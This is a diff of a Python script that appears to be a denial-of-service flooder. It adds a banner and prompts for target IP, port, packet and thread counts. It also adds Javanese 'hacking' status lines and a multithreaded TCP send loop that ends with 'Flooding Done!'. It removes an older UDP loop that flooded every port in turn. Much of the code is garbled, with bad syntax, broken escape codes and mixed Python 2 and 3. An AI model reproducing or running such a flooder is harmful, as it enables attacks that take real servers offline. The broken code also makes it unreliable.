@@ -33,29 +33,43 @@ class bcolors:
 # CLEAR
 os.system("clear")
 print("")
-print("\033[   \033[0m")
-print("\033[   \033[0m")
-print("\033[   \033[0m")
-print("\033[   \033[0m")
-print("\033[   \033[0m")
-print("\033[   \033[0m")
-print("\033[   \033[0m")
-print("\033[   \033[0m")
-print("\033[   \033[0m")
-print("\033[   \033[0m")
-print("\033[   \033[0m")
-print("\033[   \033[0m")
-print("\033[   \033[0m")
-print("\033[   \033[0m")
+print("\033[33m         @ @ @     @ @ @ @ @   @ @ @ @        @ @ @      @ @ @ @       \033[0m")
+print("\033[33m      @        @          @    @       @    @        @   @       @     \033[0m")
+print("\033[33m     @          @        @     @        @  @          @  @        @    \033[0m")
+print("\033[96m     @          @       @      @        @  @          @  @        @    \033[0m")
+print("\033[96m     @          @      @       @       @   @          @  @       @     \033[0m")
+print("\033[31m     @          @     @        @ @ @ @     @          @  @ @ @ @       \033[0m")
+print("\033[31m      @        @     @         @            @        @   @      @      \033[0m")
+print("\033[31m         @ @ @      @ @ @ @ @  @               @ @ @     @        @    \033[0m")
 print(" ")
-ip = str_input("033[94m[\033[0m" "\033[1m*\033\0m" "\033[94m]\033[0m" "\033[91mIP Target \033[0m ")
+print("\033[96m                                                 @ @ @        @      \033[0m")
+print("\033[96m                                               @       @     @       \033[0m")
+print("\033[96m                                                      @     @     @  \033[0m")
+print("\033[92m                                                    @      @      @  \033[0m")
+print("\033[92m                                                  @       @ @ @ @ @  \033[0m")
+print("\033[92m                                                @ @ @ @ @         @  \033[0m")
+print(" ")
+ip = str_input("033[94m[\033[0m" "\033[1m+\033\0m" "\033[94m]\033[0m" "\033[91mIP Target \033[0m : ")
 print("\033[97m⁵⁵⁵>\033\0m")
-port = int(input("033[94m[\033[0m" "\033[1m*\033\0m" "\033[94m]\033[0m" "\033[91mPort \033[0m ")
+port = int(input("033[94m[\033[0m" "\033[1m*\033\0m" "\033[94m]\033[0m" "\033[91mPort \033[0m : "))
+print("\033[97m⁵⁵⁵>\033[0m")
+packs = int(input("033[94m[\033[0m" "\033[1m*\033\0m" "\033[94m]\033[0m" "\033[91mPackets{0} \033[0m : "))
 print("\033[97m⁵⁵⁵>\033\0m")
-packs =
+thread = int(input("033[94m[\033[0m" "\033[1m*\033\0m" "\033[94m]\033[0m" "\033[91mThreads \033[0m : "))
 print("\033[97m⁵⁵⁵>\033\0m")
+os.system("clear")
+print ("\033[92mBIRUH BIDDAM NAFDIKA YAA AQSHA 033[0m ")
+print ("\033[92m⁵⁵⁵⁵⁵⁵⁵⁵⁵>>> SIYAP-SIYAP GOLEK SERVER \033[0m ")
+time.sleep(0.05)
+print ("\033[92m⁵⁵⁵⁵⁵⁵⁵⁵⁵>>> MIWITI GOLEK SAMBUNGAN \033[0m ")
+time.sleep(0.05)
+print ("\033[92m⁵⁵⁵⁵⁵⁵⁵⁵⁵>>> NEMBUS LAPISAN KEAMANAN \033[0m ")
+time.sleep(0.05)
+print ("\033[92m⁵⁵⁵⁵⁵⁵⁵⁵⁵>>> DIGAWE SAMBUNGAN \033[0m ")
+time.sleep(0.05)
+print ("\033[92m⁵⁵⁵⁵⁵⁵⁵⁵⁵>>> WESS TAK KEMPLANGI SRIWILL \033[0m"))
 
-print("\033[97m⁵⁵⁵>\033\0m")
+
 
 def animated_marker();
     widgets = [FormatLabel('Animated Bouncer: value %(value)d - '),
@@ -77,6 +91,15 @@ def start():
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.connect((ip,port))
          s.send(r)
+         u += 1
+         print("\033[92m[\033[97m+\033[92m]\033[92m0ps BADAI GURUN " +str(u)+ " \033[93mZNEEPER B453 " +str()+ " \033[1m" +ip+ "\033[0m" )
+    except:
+      s.close()
+      print("\033[97m[\033[91m-\033[97m]\033[91mFlooding Done!")
+
+for x in range(thread):
+  thred = threading.Thread(target=start)
+  thred.start()
 
 
 
@@ -84,28 +107,3 @@ def start():
 
 
 
-def shortcut_example() -> None:
-    for _ in progressbar.progressbar(range(10)):
-        time.sleep(0.1)
-           
-os.system("clear")
-print("BIRUH BIDDAM NAFDIKA YAA AQSHA")
-print ("\033[92m")
-print "__________ °° SIYAP-SIYAP GOLEK SERVER °°__________"
-time.sleep(5)
-print "_____________°° MIWITI GOLEK SAMBUNGAN °°____________"
-time.sleep(5)
-print "_______________°° NEMBUS LAPISAN KEAMANAN °°____________"
-time.sleep(5)
-print "__________________°° DIGAWE SAMBUNGAN °°__________________"
-time.sleep(5)
-print "______________°° WESS TAK KEMPLANGI SRIWILL °°______________"
-time.sleep(3)
-sent = 0
-while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-     if port == 65534:
-       port = 1
